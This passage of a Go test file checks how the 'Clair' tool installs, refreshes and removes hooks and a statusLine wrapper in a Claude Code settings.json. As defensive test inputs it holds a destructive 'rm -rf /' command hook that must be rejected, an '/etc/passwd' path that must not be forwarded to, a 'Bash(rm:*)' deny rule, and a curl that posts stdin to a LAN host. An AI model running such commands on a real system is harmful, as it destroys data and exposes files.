	if _, err := in.Install(defaultHooks()); err == nil {
		t.Fatal("Install on an array: want an error")
	}
	if got := backups(t, in); len(got) != 0 {
		t.Error("a refused install left a backup")
	}
}

// Concurrent installs and uninstalls — the daemon's snippets racing `clair
// pair` or `clair unpair` — each see the others' writes: nothing the user
// wrote is lost and the file is never missing or torn (AG-7).
func TestConcurrentInstallsKeepTheUsersSettings(t *testing.T) {
	t.Parallel()

	in := fixture(t, `{"permissions":{"deny":["Bash(rm:*)"]},"statusLine":{"type":"command","command":"printf ok"}}`)
	const workers, rounds = 4, 25
	var wg sync.WaitGroup
	for w := range workers {
		wg.Go(func() {
			for r := range rounds {
				var err error
				if (w+r)%3 == 0 {
					_, err = in.Uninstall()
				} else {
					_, err = in.Install(defaultHooks())
				}
				if err != nil {
					t.Errorf("worker %d round %d: %v", w, r, err)
					return
				}
			}
		})
	}
	wg.Wait()
	s := readSettings(t, in)
	if got := compact(t, mustGet(t, s, "permissions")); got != `{"deny":["Bash(rm:*)"]}` {
		t.Errorf("permissions = %s, want the user's deny rule kept", got)
	}
	if _, err := in.Install(defaultHooks()); err != nil {
		t.Fatal(err)
	}
	if _, err := in.Uninstall(); err != nil {
		t.Fatal(err)
	}
	if got := compact(t, mustGet(t, readSettings(t, in), "statusLine")); got != `{"type":"command","command":"printf ok"}` {
		t.Errorf("statusLine after the storm and an uninstall = %s, want the user's own back", got)
	}
}

// selfExe makes a stand-in for this binary under a release artifact's name
// or another, in its own directory.
func selfExe(t *testing.T, name string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return path
}

// A second install must never save the agent's own statusLine as the
// user's, whatever the binary is called: `clair statusline` would then run
// itself, and every refresh would fork without end (AG-6).
func TestSecondInstallNeverSavesOurOwnStatusLine(t *testing.T) {
	t.Parallel()

	for _, name := range []string{"clair-linux-amd64", "cl"} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			in := fixture(t, `{"statusLine":{"type":"command","command":"printf ok"}}`)
			in.ClairExe = selfExe(t, name)
			for range 2 {
				if _, err := in.Install(defaultHooks()); err != nil {
					t.Fatalf("Install: %v", err)
				}
			}
			if got := commandOf(in.loadOriginal()); got != "printf ok" {
				t.Errorf("saved original = %q, want the user's printf ok", got)
			}
			// Another spelling of the same file is still ours.
			linked := filepath.Join(t.TempDir(), "other-name")
			if err := os.Symlink(in.ClairExe, linked); err != nil {
				t.Skipf("symlink: %v", err)
			}
			if !in.isOurs(StatusLineCommand(linked)) {
				t.Errorf("isOurs(%q) = false, want true: it runs this binary", StatusLineCommand(linked))
			}
		})
	}
}

// An original already poisoned by an older install is neither run nor
// restored, and a nested run runs no original at all.
func TestRunStatuslineNeverRunsItself(t *testing.T) {
	t.Parallel()

	exe := selfExe(t, "cl")
	var ran []string
	var mu sync.Mutex
	runOriginal := func(_ context.Context, command string, _ []byte, _, _ io.Writer) (int, error) {
		mu.Lock()
		defer mu.Unlock()
		ran = append(ran, command)
		return 0, nil
	}
	for _, tt := range []struct {
		name     string
		original string
		nested   bool
	}{
		{name: "itself under another name", original: StatusLineCommand(exe)},
		{name: "a release build", original: "/usr/local/bin/clair-linux-amd64 statusline"},
		{name: "any original when nested", original: "printf ok", nested: true},
	} {
		in := fixture(t, "")
		saved, merr := json.Marshal(map[string]string{"type": "command", "command": tt.original})
		if merr != nil {
			t.Fatal(merr)
		}
		if err := os.WriteFile(in.originalPath(), saved, 0o644); err != nil {
			t.Fatal(err)
		}
		code := RunStatusline(t.Context(), StatuslineOptions{
			Stdin: strings.NewReader("{}"), SettingsPath: in.SettingsPath, Exe: exe, Nested: tt.nested,
			TempDir: t.TempDir(), RunOriginal: runOriginal,
		})
		if code != 0 {
			t.Errorf("%s: exit %d, want 0", tt.name, code)
		}
		if tt.nested {
			continue
		}
		// Uninstall does not put the poisoned original back either.
		in.ClairExe = exe
		if err := os.WriteFile(in.SettingsPath, []byte(`{"statusLine":{"type":"command","command":"`+StatusLineCommand(exe)+`"}}`), 0o644); err != nil {
			t.Fatal(err)
		}
		report, err := in.Uninstall()
		if err != nil || report.StatusLine != "removed" {
			t.Errorf("%s: Uninstall = %+v, %v; want the statusLine removed", tt.name, report, err)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(ran) != 0 {
		t.Errorf("ran originals %q, want none", ran)
	}
}

func TestSnippetInstaller(t *testing.T) {
	t.Parallel()

	in := fixture(t, "")
	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
	good := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:__PORT__/clair/v1/hook/event","headers":{"Authorization":"Bearer __TOKEN__","X-Clair-Host":"__CLAIR_HOST__"},"timeout":2}]}]}}`)
	if _, err := si.InstallSnippet(good); err != nil {
		t.Fatalf("InstallSnippet: %v", err)
	}
	s := readSettings(t, in)
	if got := compact(t, mustGet(t, s, "hooks")); !strings.Contains(got, `"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"`) {
		t.Errorf("hooks = %s", got)
	}
	bad := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"rm -rf /"}]}]}}`)
	if _, err := si.InstallSnippet(bad); !errors.Is(err, ErrSnippetRejected) {
		t.Errorf("InstallSnippet(command hook): err = %v, want ErrSnippetRejected", err)
	}
	if err := si.Uninstall(); err != nil {
		t.Fatalf("Uninstall: %v", err)
	}
	if _, ok := readSettings(t, in).Get("hooks"); ok {
		t.Error("hooks remain after Uninstall")
	}
}

// Installing the snippet that is already installed — the phone may send it
// again — rewrites nothing and backs nothing up.
func TestInstallSnippetTwiceWritesOnce(t *testing.T) {
	t.Parallel()

	in := fixture(t, `{"permissions":{},"statusLine":{"type":"command","command":"printf ok"}}`)
	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
	first, err := si.InstallSnippet(phoneTemplate(t))
	if err != nil || first.Unchanged || first.Backup == "" {
		t.Fatalf("first InstallSnippet = %+v, %v; want a write with a backup", first, err)
	}
	old := time.Date(2001, 1, 1, 0, 0, 0, 0, time.UTC)
	for _, path := range []string{in.SettingsPath, in.originalPath()} {
		if cerr := os.Chtimes(path, old, old); cerr != nil {
			t.Fatal(cerr)
		}
	}
	before, _ := os.ReadFile(in.SettingsPath)
	again, err := si.InstallSnippet(phoneTemplate(t))
	if err != nil || !again.Unchanged || again.Backup != "" {
		t.Fatalf("second InstallSnippet = %+v, %v; want unchanged", again, err)
	}
	for _, path := range []string{in.SettingsPath, in.originalPath()} {
		if info, err := os.Stat(path); err != nil || !info.ModTime().Equal(old) {
			t.Errorf("%s was rewritten (%v)", filepath.Base(path), err)
		}
	}
	if after, _ := os.ReadFile(in.SettingsPath); !bytes.Equal(before, after) {
		t.Error("settings.json changed")
	}
	if got := backups(t, in); len(got) != 1 {
		t.Errorf("backups = %v, want only the first install's", got)
	}
	// A different snippet is written again.
	changed := bytes.Replace(phoneTemplate(t), []byte(`"timeout": 2`), []byte(`"timeout": 3`), 1)
	if r, err := si.InstallSnippet(changed); err != nil || r.Unchanged || r.Backup == "" {
		t.Errorf("a changed snippet: %+v, %v; want a write with a backup", r, err)
	}
}

// At pairing a phone never leaves the host without hooks: a refused
// snippet gives way to the built-in block, with the offence named, and only
// a settings.json that cannot be written at all is an error.
func TestInstallAtPairing(t *testing.T) {
	t.Parallel()

	builtIn := compact(t, ojson.AsObject(defaultHooks()))
	refused := json.RawMessage(`{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"rm -rf /"}]}]}}`)
	tests := []struct {
		name      string
		settings  string
		snippet   json.RawMessage
		wantErr   bool
		wantWarns []string // substrings, one per warning
	}{
		{name: "no snippet", snippet: nil},
		{name: "a null snippet", snippet: json.RawMessage(`null`)},
		{name: "the phone's template", snippet: phoneTemplate(t)},
		{name: "a refused snippet", snippet: refused, wantWarns: []string{"refused (claudecfg: snippet rejected: Stop has a command hook other than"}},
		{name: "a snippet that is not JSON", snippet: json.RawMessage(`{`), wantWarns: []string{"built-in hooks were written instead"}},
		{
			name:      "events the agent does not hook",
			snippet:   bytes.Replace(phoneTemplate(t), []byte(`"SessionStart"`), []byte(`"SubagentStart"`), 1),
			wantWarns: []string{`left out: "SubagentStart"`},
		},
		{name: "settings.json that is not an object", settings: `[1]`, snippet: phoneTemplate(t), wantErr: true},
		{name: "a refused snippet and settings.json that is not an object", settings: `[1]`, snippet: refused, wantErr: true, wantWarns: []string{"refused"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			in := fixture(t, tt.settings)
			si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
			report, err := si.InstallAtPairing(tt.snippet)
			if (err != nil) != tt.wantErr {
				t.Fatalf("InstallAtPairing: err = %v, want error %v", err, tt.wantErr)
			}
			warns := report.Warnings()
			if len(warns) != len(tt.wantWarns) {
				t.Fatalf("warnings = %q, want %d", warns, len(tt.wantWarns))
			}
			for i, want := range tt.wantWarns {
				if !strings.Contains(warns[i], want) {
					t.Errorf("warning %d = %q, want it to contain %q", i, warns[i], want)
				}
			}
			if tt.wantErr {
				return
			}
			hooks := ojson.NewObject()
			hooks.Set("hooks", mustGet(t, readSettings(t, in), "hooks"))
			if got := compact(t, hooks); !strings.Contains(tt.name, "does not hook") && got != builtIn {
				t.Errorf("hooks =\n%s\nwant the built-in block\n%s", got, builtIn)
			}
		})
	}
}

func refresher(t *testing.T, before string) SnippetInstaller {
	t.Helper()
	return SnippetInstaller{Installer: fixture(t, before), BaseURL: baseURL, Port: 7317, Token: "t0k3n", Host: "walter-laptop"}
}

// A block written before the template changed takes the template's headers
// and options where it stands, keeping what the phone chose and the user's
// own hooks, order and statusLine, and gains the agent's own events at the
// end; a second refresh finds nothing to do.
func TestRefreshHooksBringsAnOlderBlockToTheTemplate(t *testing.T) {
	t.Parallel()

	before, err := os.ReadFile("testdata/settings-installed-r11.json")
	if err != nil {
		t.Fatal(err)
	}
	want, err := os.ReadFile("testdata/settings-refreshed.json")
	if err != nil {
		t.Fatal(err)
	}
	si := refresher(t, string(before))
	report, err := si.RefreshHooks()
	if err != nil {
		t.Fatalf("RefreshHooks: %v", err)
	}
	if report.Groups != 5 || report.Unchanged || report.Backup == "" || report.StatusLine != "" || !slices.Equal(report.Added, AgentEvents()) {
		t.Errorf("report = %+v, want 4 groups rewritten and %v added, with a backup and the statusLine untouched", report, AgentEvents())
	}
	if got, _ := os.ReadFile(si.SettingsPath); !bytes.Equal(got, want) {
		t.Errorf("settings.json =\n%s\nwant\n%s", got, want)
	}
	if saved, _ := os.ReadFile(report.Backup); !bytes.Equal(saved, before) {
		t.Errorf("backup =\n%s\nwant the file as it was", saved)
	}
	if _, statErr := os.Stat(si.originalPath()); !errors.Is(statErr, os.ErrNotExist) {
		t.Errorf("original.json: %v, want none: a refresh never wraps the statusLine", statErr)
	}

	again, err := si.RefreshHooks()
	if err != nil || !again.Unchanged || again.Backup != "" || again.Groups != 5 || len(again.Added) != 0 {
		t.Errorf("second RefreshHooks = %+v, %v; want 5 groups unchanged, none added", again, err)
	}
	if got := backups(t, si.Installer); len(got) != 1 {
		t.Errorf("backups = %v, want only the first refresh's", got)
	}
}

// The SessionStart command names whichever binary wrote it; a refresh takes
// any Clair binary's, under any name it is linked by, and writes this one's.
func TestRefreshHooksTakesThisBinaryUnderAnyName(t *testing.T) {
	t.Parallel()

	si := refresher(t, "")
	si.ClairExe = selfExe(t, "cl")
	linked := filepath.Join(t.TempDir(), "other-name")
	if err := os.Symlink(si.ClairExe, linked); err != nil {
		t.Skipf("symlink: %v", err)
	}
	settings := `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":` + strconv.Quote(HookEventCommand(linked)) + `}]}]}}`
	if err := os.WriteFile(si.SettingsPath, []byte(settings), 0o600); err != nil {
		t.Fatal(err)
	}
	report, err := si.RefreshHooks()
	if err != nil || report.Groups != 1 || report.Unchanged || len(report.Added) != 0 {
		t.Fatalf("RefreshHooks = %+v, %v; want the one group rewritten and nothing added without the decide hook", report, err)
	}
	hooks := ojson.AsObject(mustGet(t, readSettings(t, si.Installer), "hooks"))
	want := `[{"hooks":[{"type":"command","command":` + strconv.Quote(HookEventCommand(si.ClairExe)) + `}]}]`
	if got := compact(t, mustGet(t, hooks, "SessionStart")); got != want {
		t.Errorf("SessionStart = %s, want %s", got, want)
	}
}

// With no Clair hook in settings.json — never installed, or removed by hand —
// a refresh writes nothing, and never creates the file.
func TestRefreshHooksLeavesAHostWithoutClairHooksAlone(t *testing.T) {
	t.Parallel()

	for _, tt := range []struct{ name, settings string }{
		{name: "no settings.json"},
		{name: "only the user's hooks", settings: `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"say done"}]}]}}`},
		{name: "only the user's own PostToolBatch", settings: `{"hooks":{"PostToolBatch":[{"hooks":[{"type":"command","command":"log-batch.sh"}]}]}}`},
		{name: "no hooks at all", settings: `{"model":"opus"}`},
	} {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			si := refresher(t, tt.settings)
			report, err := si.RefreshHooks()
			if err != nil || report.Groups != 0 || !report.Unchanged || report.Backup != "" {
				t.Errorf("RefreshHooks = %+v, %v; want 0 groups, unchanged", report, err)
			}
			got, err := os.ReadFile(si.SettingsPath)
			if tt.settings == "" {
				if !errors.Is(err, os.ErrNotExist) {
					t.Errorf("settings.json = %q (%v), want none", got, err)
				}
				return
			}
			if string(got) != tt.settings {
				t.Errorf("settings.json = %s, want it as it was", got)
			}
		})
	}
}

// A Clair group the rebuild refuses — another port, a hook of the user's in
// the same group, a hook-event that no Clair binary runs — leaves the whole
// file as it was.
func TestRefreshHooksRefusesWhatItCannotRebuild(t *testing.T) {
	t.Parallel()

	ours := `{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","timeout":2}`
	for _, tt := range []struct{ name, group string }{
		{name: "another port", group: `{"hooks":[{"type":"http","url":"http://127.0.0.1:7318/clair/v1/hook/event","timeout":2}]}`},
		{name: "a user's hook in the group", group: `{"hooks":[` + ours + `,{"type":"command","command":"say done"}]}`},
		{name: "the LAN installer's curl", group: `{"hooks":[{"type":"command","command":"curl -s --data-binary @- http://192.168.1.5:7317/clair/v1/hook/event"}]}`},
		{name: "another program's hook-event", group: `{"hooks":[{"type":"command","command":"/usr/bin/env hook-event /clair/v1/hook/event"}]}`},
	} {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			event := "Stop"
			if strings.Contains(tt.group, `"command"`) && !strings.Contains(tt.group, ours) {
				event = "SessionStart"
			}
			settings := `{"hooks":{"PreToolUse":[{"hooks":[` + ours + `]}],"` + event + `":[` + tt.group + `]}}`
			si := refresher(t, settings)
			if _, err := si.RefreshHooks(); !errors.Is(err, ErrSnippetRejected) {
				t.Errorf("RefreshHooks: err = %v, want ErrSnippetRejected", err)
			}
			if got, _ := os.ReadFile(si.SettingsPath); string(got) != settings {
				t.Errorf("settings.json = %s, want it as it was", got)
			}
			if got := backups(t, si.Installer); len(got) != 0 {
				t.Errorf("backups = %v, want none", got)
			}
		})
	}
}

// The phone's template does not list the agent's own events, so a snippet
// gets them after its own events whenever it has the decide hook; one that
// lists an event keeps its own shape of it (ADR 2026-10.ukr9).
func TestValidateSnippetAddsTheAgentsEvents(t *testing.T) {
	t.Parallel()

	const (
		decide = `"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide"}]}]`
		stop   = `"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","timeout":2}]}]`
		batch5 = `"PostToolBatch":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","timeout":5}]}]`
	)
	omit := snippetConfig
	omit.OmitAgentEvents = true
	tests := []struct {
		name, snippet string
		c             SnippetConfig
		want          []string // the events, in order
		batchTimeout  string
	}{
		{"added after the phone's events", `{"hooks":{` + decide + `,` + stop + `}}`, snippetConfig, []string{"PermissionRequest", "Stop", "PostToolBatch"}, "2"},
		{"kept where the snippet put it, with its timeout", `{"hooks":{` + decide + `,` + batch5 + `,` + stop + `}}`, snippetConfig, []string{"PermissionRequest", "PostToolBatch", "Stop"}, "5"},
		{"none without the decide hook", `{"hooks":{` + stop + `}}`, snippetConfig, []string{"Stop"}, ""},
		{"none when left out", `{"hooks":{` + decide + `,` + stop + `}}`, omit, []string{"PermissionRequest", "Stop"}, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			out, dropped, err := ValidateSnippet([]byte(tt.snippet), tt.c)
			if err != nil || dropped != nil {
				t.Fatalf("ValidateSnippet: %v, dropped %q", err, dropped)
			}
			hooks := ojson.AsObject(mustGet(t, out, "hooks"))
			if got := hooks.Keys(); !slices.Equal(got, tt.want) {
				t.Fatalf("events = %q, want %q", got, tt.want)
			}
			if tt.batchTimeout == "" {
				return
			}
			want := `[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"},"timeout":` + tt.batchTimeout + `}]}]`
			if got := compact(t, mustGet(t, hooks, "PostToolBatch")); got != want {
				t.Errorf("PostToolBatch = %s, want %s", got, want)
			}
		})
	}
}

func TestRenderHooksCanLeaveTheAgentsEventsOut(t *testing.T) {
	t.Parallel()

	hooks := ojson.AsObject(mustGet(t, RenderHooks(SnippetConfig{BaseURL: baseURL, Token: "t", OmitAgentEvents: true}), "hooks"))
	for _, e := range AgentEvents() {
		if _, ok := hooks.Get(e); ok {
			t.Errorf("%s rendered although left out", e)
		}
	}
}

// A user's own hooks for an agent event stay first; Clair's group follows
// them, as an install appends it.
func TestRefreshHooksAddsTheAgentsEventsAfterTheUsers(t *testing.T) {
	t.Parallel()

	const users = `{"hooks":[{"type":"command","command":"log-batch.sh"}]}`
	si := refresher(t, `{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide?timeout=86400"}]}],"PostToolBatch":[`+users+`]}}`)
	report, err := si.RefreshHooks()
	if err != nil || report.Groups != 2 || !slices.Equal(report.Added, AgentEvents()) {
		t.Fatalf("RefreshHooks = %+v, %v; want the decide group rebuilt and PostToolBatch added", report, err)
	}
	hooks := ojson.AsObject(mustGet(t, readSettings(t, si.Installer), "hooks"))
	if got := hooks.Keys(); !slices.Equal(got, []string{"PermissionRequest", "PostToolBatch"}) {
		t.Errorf("events = %q, want the user's order", got)
	}
	want := `[` + users + `,{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"},"timeout":2}]}]`
	if got := compact(t, mustGet(t, hooks, "PostToolBatch")); got != want {
		t.Errorf("PostToolBatch = %s, want %s", got, want)
	}
}

// What the agent adds itself it must also gate: a PostToolBatch that went to
// the relay whatever the agent held would double the tool churn's bytes.
func TestEveryAgentEventIsGated(t *testing.T) {
	t.Parallel()

	for _, e := range AgentEvents() {
		if record.Forwarded(e, false) || !record.Forwarded(e, true) {
			t.Errorf("%s: Forwarded = %v without a decide, %v with one; want false, true", e, record.Forwarded(e, false), record.Forwarded(e, true))
		}
		if w := record.Wake(record.PathEvent, e, true); w != envelope.WakeSoon {
			t.Errorf("%s: Wake while a decide is held = %v, want soon", e, w)
		}
	}
}

func TestRunStatusline(t *testing.T) {
	t.Parallel()

	var mu sync.Mutex
	var posts [][]byte
	var hosts []string
	slow := make(chan struct{})
	daemon := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		mu.Lock()
		posts = append(posts, body)
		hosts = append(hosts, r.Header.Get("X-Clair-Host"))
		mu.Unlock()
		if bytes.Contains(body, []byte("slow")) {
			<-slow
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	t.Cleanup(daemon.Close)
	t.Cleanup(func() { close(slow) })
	postCount := func() int {
		mu.Lock()
		defer mu.Unlock()
		return len(posts)
	}

	in := fixture(t, "")
	if err := os.WriteFile(in.originalPath(), []byte(`{"type":"command","command":"the-original"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	var ran [][]byte
	runOriginal := func(_ context.Context, command string, stdin []byte, stdout, _ io.Writer) (int, error) {
		if command != "the-original" {
			return 0, errors.New("original command = " + command)
		}
		mu.Lock()
		ran = append(ran, stdin)
		mu.Unlock()
		_, _ = stdout.Write([]byte("it's " + string(stdin)))
		return 3, nil
	}
	now := time.Date(2026, 9, 21, 12, 0, 0, 0, time.UTC)
	opts := func(input string) StatuslineOptions {
		return StatuslineOptions{
			Stdin: strings.NewReader(input), SettingsPath: in.SettingsPath, AgentURL: daemon.URL, Token: "t", Host: "walter-laptop",
			TempDir: t.TempDir(), Now: func() time.Time { return now }, RunOriginal: runOriginal,
		}
	}
	first := opts(`{"session_id":"s-1"}`)
	var out bytes.Buffer
	first.Stdout = &out
	if code := RunStatusline(t.Context(), first); code != 3 {
		t.Errorf("exit code = %d, want the original's 3", code)
	}
	if out.String() != `it's {"session_id":"s-1"}` {
		t.Errorf("stdout = %q, want the original's output", out.String())
	}
	mu.Lock()
	if len(posts) != 1 || string(posts[0]) != `{"session_id":"s-1"}` || hosts[0] != "walter-laptop" {
		t.Errorf("posts = %q hosts = %q, want the input forwarded once with the host header", posts, hosts)
	}
	mu.Unlock()

	// Within the interval nothing is posted, the original still runs.
	second := opts(`{"session_id":"s-2"}`)
	second.TempDir = first.TempDir
	now = now.Add(10 * time.Second)
	RunStatusline(t.Context(), second)
	mu.Lock()
	if len(posts) != 1 || len(ran) != 2 {
		t.Errorf("after 10 s: %d posts, %d original runs; want 1 and 2", len(posts), len(ran))
	}
	mu.Unlock()
	now = now.Add(25 * time.Second)
	third := opts(`{"session_id":"s-3"}`)
	third.TempDir = first.TempDir
	RunStatusline(t.Context(), third)
	mu.Lock()
	if len(posts) != 2 {
		t.Errorf("after 35 s: %d posts, want 2", len(posts))
	}
	mu.Unlock()

	// A slow daemon never delays the original: its output is complete before the POST returns.
	slowOpts := opts(`{"slow":true}`)
	var slowOut bytes.Buffer
	slowOpts.Stdout = &slowOut
	originalDone := make(chan struct{})
	slowOpts.RunOriginal = func(_ context.Context, _ string, _ []byte, _, _ io.Writer) (int, error) {
		close(originalDone)
		return 0, nil
	}
	finished := make(chan int, 1)
	go func() { finished <- RunStatusline(t.Context(), slowOpts) }()
	select {
	case <-originalDone:
	case <-time.After(time.Second):
		t.Fatal("the original waited for the slow POST")
	}
	select {
	case <-finished:
	case <-time.After(5 * time.Second):
		t.Fatal("RunStatusline did not give up on the slow POST")
	}

	// No agent: the original runs, nothing is posted, nothing is printed by us.
	none := opts(`{"session_id":"s-4"}`)
	none.AgentURL = ""
	var noneErr bytes.Buffer
	none.Stderr = &noneErr
	before := postCount()
	RunStatusline(t.Context(), none)
	if postCount() != before || noneErr.Len() != 0 {
		t.Errorf("without an agent: %d new posts, stderr %q", postCount()-before, noneErr.String())
	}

	// Non-JSON input is not forwarded.
	junk := opts("not json")
	RunStatusline(t.Context(), junk)
	if postCount() != before {
		t.Error("junk input was posted")
	}
}

func TestRunStatuslineWithoutAnOriginal(t *testing.T) {
	t.Parallel()

	in := fixture(t, "")
	var out bytes.Buffer
	code := RunStatusline(t.Context(), StatuslineOptions{Stdin: strings.NewReader("{}"), Stdout: &out, SettingsPath: in.SettingsPath, TempDir: t.TempDir()})
	if code != 0 || out.Len() != 0 {
		t.Errorf("RunStatusline without an original = %d, %q; want 0 and no output", code, out.String())
	}
}

func TestRunHookEvent(t *testing.T) {
	t.Parallel()

	var mu sync.Mutex
	var got []string
	daemon := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		mu.Lock()
		got = append(got, r.URL.Path+" "+r.Header.Get("Authorization")+" "+r.Header.Get("X-Clair-Host")+" "+string(body))
		mu.Unlock()
		w.WriteHeader(http.StatusNoContent)
	}))
	t.Cleanup(daemon.Close)
	base := HookEventOptions{Stdin: strings.NewReader(`{"session_id":"s","hook_event_name":"SessionStart"}`), Path: "/clair/v1/hook/event", AgentURL: daemon.URL, Token: "t", Host: "walter-laptop"}
	if code := RunHookEvent(t.Context(), base); code != 0 {
		t.Errorf("RunHookEvent = %d", code)
	}
	mu.Lock()
	if len(got) != 1 || got[0] != `/clair/v1/hook/event Bearer t walter-laptop {"session_id":"s","hook_event_name":"SessionStart"}` {
		t.Errorf("daemon saw %q", got)
	}
	mu.Unlock()
	for name, o := range map[string]HookEventOptions{
		"no agent":      {Stdin: strings.NewReader(`{}`), Path: "/clair/v1/hook/event"},
		"foreign path":  {Stdin: strings.NewReader(`{}`), Path: "/etc/passwd", AgentURL: daemon.URL},
		"not json":      {Stdin: strings.NewReader(`nope`), Path: "/clair/v1/hook/event", AgentURL: daemon.URL},
		"agent is down": {Stdin: strings.NewReader(`{}`), Path: "/clair/v1/hook/event", AgentURL: "http://127.0.0.1:1"},
	} {
		if code := RunHookEvent(t.Context(), o); code != 0 {
			t.Errorf("%s: RunHookEvent = %d, want 0 (a hook never fails on our account)", name, code)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(got) != 1 {
		t.Errorf("daemon saw %d posts, want only the first", len(got))
	}
}
